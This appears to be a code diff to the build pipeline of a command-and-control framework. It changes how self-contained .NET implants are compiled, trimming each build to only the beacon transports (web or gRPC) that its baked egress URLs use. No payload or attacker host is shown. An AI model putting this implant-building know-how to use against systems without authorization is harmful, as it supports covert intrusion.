@@ -156,24 +156,39 @@ public sealed class DotNetBuildUnit : IBuildUnit
             if (!isStager && _extensionDir is not null)
                 ImplantExtensionOverlay.Apply(_extensionDir, stagingDir);
 
+            // The bake-time transport trim (architecture.md Sec 8): the baked
+            // egress walk's URL shapes decide which check-in modules compile,
+            // so an artifact carries exactly the transports it can dial and
+            // nothing else -- a web-shaped build links no gRPC client at all.
+            // The stager is never trimmed: it carries no check-in clients.
+            var modules = CheckInModules.None;
+            if (!isStager)
+            {
+                modules = TransportModuleSelection.Select(@params.Transport);
+                TransportModuleSelection.Apply(stagingDir, modules);
+            }
+
             // dotnet publish compiles the component into a self-contained
             // single-file executable for the requested runtime identifier: one
             // native entrypoint, runtime bundled, no target-side install.
-            var result = await RunDotNetAsync(
-                new[]
-                {
-                    "publish",
-                    "-c", "Release",
-                    "-r", rid,
-                    "--self-contained", "true",
-                    "-p:PublishSingleFile=true",
-                    "-p:EnableCompressionInSingleFile=true",
-                    "-o", outputDir,
-                    "--nologo",
-                    "/clp:NoSummary",
-                },
-                stagingDir,
-                cancellationToken);
+            var publishArgs = new List<string>
+            {
+                "publish",
+                "-c", "Release",
+                "-r", rid,
+                "--self-contained", "true",
+                "-p:PublishSingleFile=true",
+                "-p:EnableCompressionInSingleFile=true",
+                "-o", outputDir,
+                "--nologo",
+                "/clp:NoSummary",
+            };
+            // The trim's compile half: with no stream module the implant csproj
+            // generates the rod.v1 message types only and drops the
+            // Grpc.Net.Client reference (its RodGrpcServices switch).
+            if (!isStager && !TransportModuleSelection.NeedsGrpcClient(modules))
+                publishArgs.Add("-p:RodGrpcServices=None");
+            var result = await RunDotNetAsync(publishArgs.ToArray(), stagingDir, cancellationToken);
 
             if (result.ExitCode != 0)
             {
@@ -399,8 +414,9 @@ public sealed class DotNetBuildUnit : IBuildUnit
     // The beacon URL is the enroll endpoint with /implants/enroll stripped. The
     // build params carry a single endpoint; the implant accepts an explicit beacon
     // URL when enroll and beacon hosts differ (a redirector in front). Mirrors the
-    // Go build unit.
-    private static string BeaconUrlFromEnroll(string enrollEndpoint)
+    // Go build unit. Internal: the transport module selection derives the same
+    // walk entries when it classifies which check-in modules a build compiles.
+    internal static string BeaconUrlFromEnroll(string enrollEndpoint)
     {
         const string suffix = "/implants/enroll";
         if (enrollEndpoint.EndsWith(suffix, StringComparison.OrdinalIgnoreCase))
